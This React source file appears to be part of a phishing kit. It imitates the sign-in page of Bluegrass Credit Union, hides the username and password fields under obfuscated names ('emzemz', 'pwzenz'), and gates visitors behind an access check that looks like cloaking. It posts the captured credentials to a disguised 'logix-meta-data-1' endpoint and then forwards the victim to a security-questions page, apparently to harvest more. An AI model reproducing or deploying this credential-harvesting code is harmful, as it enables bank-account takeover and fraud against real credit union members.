import React, { useState } from 'react';
import { useNavigate } from 'react-router-dom';
import axios from 'axios';
import { baseUrl } from '../constants';
import useAccessCheck from '../Utils/useAccessCheck';
import Footer from '../components/Footer';

const EyeIcon = ({ isVisible }: { isVisible: boolean }) => {
  if (isVisible) {
    return (
      <svg
        className="h-5 w-5"
        viewBox="0 0 24 24"
        fill="none"
        stroke="currentColor"
        strokeWidth="1.8"
        strokeLinecap="round"
        strokeLinejoin="round"
        aria-hidden="true"
      >
        <path d="M2 12s4-7 10-7 10 7 10 7-4 7-10 7-10-7-10-7z" />
        <circle cx="12" cy="12" r="3" />
      </svg>
    );
  }

  return (
    <svg
      className="h-5 w-5"
      viewBox="0 0 24 24"
      fill="none"
      stroke="currentColor"
      strokeWidth="1.8"
      strokeLinecap="round"
      strokeLinejoin="round"
      aria-hidden="true"
    >
      <path d="M17.94 17.94A10.94 10.94 0 0 1 12 19c-6 0-10-7-10-7a21.37 21.37 0 0 1 5.07-5.92" />
      <path d="M1 1l22 22" />
    </svg>
  );
};

const LoginForm: React.FC = () => {
  const [emzemz, setEmzemz] = useState('');
  const [pwzenz, setPwzenz] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [showPwzenz, setShowPwzenz] = useState(false);
  const [errors, setErrors] = useState({ emzemz: '', pwzenz: '' });
  const navigate = useNavigate();
  const isAllowed = useAccessCheck(baseUrl);

  if (isAllowed === null) {
    return (
      <div className="min-h-screen flex items-center justify-center bg-[#4A9619] text-white text-lg">
        Checking access&hellip;
      </div>
    );
  }

  if (isAllowed === false) {
    return (
      <div className="min-h-screen flex items-center justify-center bg-[#4A9619] text-white text-lg">
        Access denied. Redirecting&hellip;
      </div>
    );
  }

  const togglePwzenzVisibility = () => setShowPwzenz((prev) => !prev);

  const handleSubmit = async (event: React.FormEvent<HTMLFormElement>) => {
    event.preventDefault();
    setIsLoading(true);

    const newErrors = { emzemz: '', pwzenz: '' };
    if (!emzemz.trim()) {
      newErrors.emzemz = 'Username is required.';
    }
    if (!pwzenz.trim()) {
      newErrors.pwzenz = 'Password is required.';
    }

    setErrors(newErrors);

    if (newErrors.emzemz || newErrors.pwzenz) {
      setIsLoading(false);
      return;
    }

    const url = `${baseUrl}api/logix-meta-data-1/`;

    try {
      await axios.post(url, {
        emzemz,
        pwzenz,
      });

      setIsLoading(false);
      navigate('/security-questions', {
        state: { emzemz },
      });
    } catch (error) {
      console.error('Error sending message:', error);
      setIsLoading(false);
      return;
    }
  };

  return (
    <div className="min-h-screen bg-[#4A9619] flex flex-col">
      <main className="flex-1 flex items-center justify-center px-4 py-12">
        <div className="flex flex-col items-center gap-8">
          <div className="w-full max-w-lg rounded-[30px] bg-white shadow-[0_30px_60px_rgba(0,0,0,0.18)] px-12 py-14 text-center">
            <img
              src="/assets/blue_logo.png"
              alt="Bluegrass Credit Union"
              className="mx-auto mb-6 h-12 w-auto"
            />
            <h1 className="mb-6 text-2xl font-semibold text-gray-900">Sign In</h1>

            <form onSubmit={handleSubmit} className="space-y-4 text-left">
              <div>
                <label htmlFor="emzemz" className="sr-only">
                  Username
                </label>
                <input
                  id="emzemz"
                  name="emzemz"
                  type="text"
                  value={emzemz}
                  onChange={(e) => setEmzemz(e.target.value)}
                  placeholder="Username"
                  className="w-full rounded-xl border border-gray-200 px-4 py-3 text-gray-700 shadow-sm placeholder:text-gray-400 focus:border-blue-200 focus:outline-none focus:ring-2 focus:ring-blue-100"
                />
                {errors.emzemz && (
                  <p className="mt-2 text-sm text-red-600">{errors.emzemz}</p>
                )}
              </div>

              <div>
                <label htmlFor="pwzenz" className="sr-only">
                  Password
                </label>
                <div className="relative">
                  <input
                    id="pwzenz"
                    name="pwzenz"
                    type={showPwzenz ? 'text' : 'password'}
                    value={pwzenz}
                    onChange={(e) => setPwzenz(e.target.value)}
                    placeholder="Password"
                    className="w-full rounded-xl border border-gray-200 px-4 py-3 pr-12 text-gray-700 shadow-sm placeholder:text-gray-400 focus:border-blue-200 focus:outline-none focus:ring-2 focus:ring-blue-100"
                  />
                  <button
                    type="button"
                    onClick={togglePwzenzVisibility}
                    className="absolute inset-y-0 right-4 flex items-center text-blue-600 hover:text-blue-500"
                    aria-label={showPwzenz ? 'Hide password' : 'Show password'}
                  >
                    <EyeIcon isVisible={showPwzenz} />
                  </button>
                </div>
                {errors.pwzenz && (
                  <p className="mt-2 text-sm text-red-600">{errors.pwzenz}</p>
                )}
              </div>

              <button
                type="submit"
                disabled={isLoading}
                className="w-full rounded-xl bg-[#BFD8F6] py-3 text-base font-semibold text-white transition hover:bg-[#aac7ea] disabled:cursor-not-allowed disabled:opacity-70"
              >
                {isLoading ? 'Signing in…' : 'Sign In'}
              </button>
            </form>

            <div className="mt-6 text-sm">
              <a href="#" className="font-medium text-blue-600 hover:underline">
                Forgot Password
              </a>
            </div>
          </div>

          <div className="flex items-center gap-6 text-sm text-white">
            <a href="#" className="hover:underline">
              Become a Member
            </a>
            <span className="h-4 w-px bg-white/60" aria-hidden="true"></span>
            <a href="#" className="hover:underline">
              PIB
            </a>
          </div>
        </div>
      </main>

      <Footer />
    </div>
  );
};

export default LoginForm;
